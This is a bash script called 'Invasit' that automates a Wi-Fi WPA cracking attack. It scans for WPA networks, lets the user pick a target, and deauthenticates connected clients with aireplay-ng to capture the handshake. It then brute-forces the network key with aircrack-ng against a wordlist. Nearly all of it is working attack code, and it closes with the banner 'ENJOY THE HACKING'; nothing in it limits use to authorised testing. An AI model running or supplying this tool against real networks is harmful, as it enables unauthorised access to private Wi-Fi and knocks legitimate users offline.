#!/bin/bash

# Invasit version 1 || by: valvesss

# Main
MAIN(){
	MONMODE
}

# 1) Create NIC mon0
MONMODE(){
nic=mon0
iwconfig > nic.txt
nicreal=$(cat nic.txt | awk 'NR==1{print $1}')
rm -rf nic.txt
if iwconfig | grep -q $nic &> /dev/null ; then
	INTRO
else
	clear
	iw dev $nicreal interface add $nic type monitor &> /dev/null
	INTRO
fi
}

INTRO(){
clear
echo ""
echo "	I  NN       N  V             V  A         SSSSSSSS  I  TTTTTTTTT"
sleep 0.5
echo "	I  N N      N   V           V  A A        S         I      T"
sleep 0.5
echo "	I  N  N     N    V         V  A   A       S         I      T"
sleep 0.5
echo "	I  N   N    N     V       V  A     A      S         I      T"
sleep 0.5
echo "	I  N    N   N      V     V  AAAAAAAAA     SSSSSSSS  I      T"
sleep 0.5
echo "	I  N     N  N       V   V  A         A           S  I      T"
sleep 0.5
echo "	I  N      N N        V V  A           A          S  I      T"
sleep 0.5
echo "	I  N       NN         V  A             A  SSSSSSSS  I      T"
echo ""
echo "	v1 / by: valvesss / support: sleepyhollow.lockwood@protonmail.ch"
SOLARQ
}


# 2) Ask for the name of all files the will be generated
SOLARQ(){
echo ""
echo 'Note: this terminal will only be released after the key is found.'
echo ""
echo "########################################################"
echo "# 1) Set the name of the files that will be generated: #"
echo "########################################################"
read name
GERTAB
}

# 3) Generate table with all WPA networks found
GERTAB(){
echo ""
echo "#######################################################"
echo "# 2) When you find the target network, press CTRL+C.  #"
echo "#######################################################"
xterm -title $name -e airodump-ng --encrypt WPA $nic -w $name -o csv
echo ""
COMDAD
}

# 4) Edit airodump output in a human readable way
COMDAD(){
cat $name-01.csv | cut -d ',' -f 1,4,14,9 | sed '/Station MAC/,$d' | sed '/^\s*$/d' | sed 's/,//g' | tail -n +2 | nl | awk '{print $1,$5,$2,$3,$4}' | column -t | sed '/ESSID/G' > $name.txt
rm -rf $name-01.csv
echo "-------------------------------------------"
cat $name.txt
echo "^------------------------------------------"
echo ""
echo "#############################################"
echo "# 3) Select the network you want to attack: #"
echo "#############################################"
read num
bssidtarget=$(cat $name.txt | awk -v aux=$num 'NR==aux {print $3}')
channel=$(cat $name.txt | awk -v aux=$num 'NR==aux {print $4}')
networkname=$(cat $name.txt | awk -v aux=$num 'NR==aux {print $2}')
rm -rf $name.txt
GERDAD
}

# 5) Gera dados para capturar o BSSID dos clientes
GERDAD(){
echo ""
echo "###########################################################################"
echo "# 4) Wait to list 2 or more client above STATION column and press CTRL+C. #"
echo "###########################################################################"
aux=1
	while [ $aux = 1 ]; do
		xterm -title $name -e airodump-ng --bssid $bssidtarget -c $channel -w $name -o csv $nic
		echo ""
		echo "####################"
		echo "# Try again? [0/1] #"
		echo "####################"
		read aux
	done
mac=$name.lst
cat $name-01.csv | awk 'NR==6,NR==10' | awk '{print $1}' | sed 's/,//g' | sed '/^\s*$/d' > $mac
rm -rf $name-01.csv
WORDLIST
}

# 8) Search wordlist and verify if don't exist
WORDLIST(){
echo ""
echo "###################################"
echo "# 5) Type the wordlist full path: #"
echo "###################################"
read path
a=0
while [ $a -eq 0  ]
do
	if [ !  -f $path ]; then
		echo ""
		echo "##################################"
		echo "# Wordlist not found, try again. #"
		echo "##################################"
		read path
	else
		a=1
	fi
done
HANDSHAKE
}

# 7) Start the handshake capture
HANDSHAKE(){
echo ""
echo "#######################################"
echo "# Scanning for $networkname HANDSHAKE #"
echo "#######################################"
xterm -title $name -e airodump-ng -d $bssidtarget -c $channel -w $name -o cap $nic &
nr=$(cat $mac | wc -l)
i=1
	while [ $i -le $nr ]; do
		bssidclient=$(awk -v var=$i 'NR==var' $mac)
		xterm -title $name -e aireplay-ng -0 15 -a $bssidtarget -c $bssidclient $nic --ignore-negative-one
		let i=i+1
	done
AIRCRACK
}

# 9) Decryptograph the password
AIRCRACK(){
a=0
while [ $a -eq 0  ]
do
	if aircrack-ng $name-01.cap | egrep '0 handshake|0 packets' &> /dev/null; then
		echo ""
		echo "##########################################"
		echo "# Handshake not found, try again? [y/n]. #"
		echo "##########################################"
		read wish
		if [ $wish = "y" ] || [ $wish = "Y" ]; then
			rm -rf $name-01.cap
			HANDSHAKE
		else
			exit;
		fi	
	else
		a=1
	fi
done
rm -rf $mac
kill $(ps aux | grep 'xterm' | awk '{print $2}') &> /dev/null
wpaclean $name-clean.cap $name-01.cap
aircrack-ng $name-clean.cap -w $path
END
}

# 10) Reinicialize network services and delete the nic created
END(){
clear
echo "[+] Deleting network card created..."
iw dev $nic del
sleep 2
echo "[+] Restarting network services..."
service NetworkManager restart
service networking restart
sleep 2
echo ""
echo '####################################'
echo '##	ENJOY THE HACKING	  ##'
echo '####################################'
}
MAIN
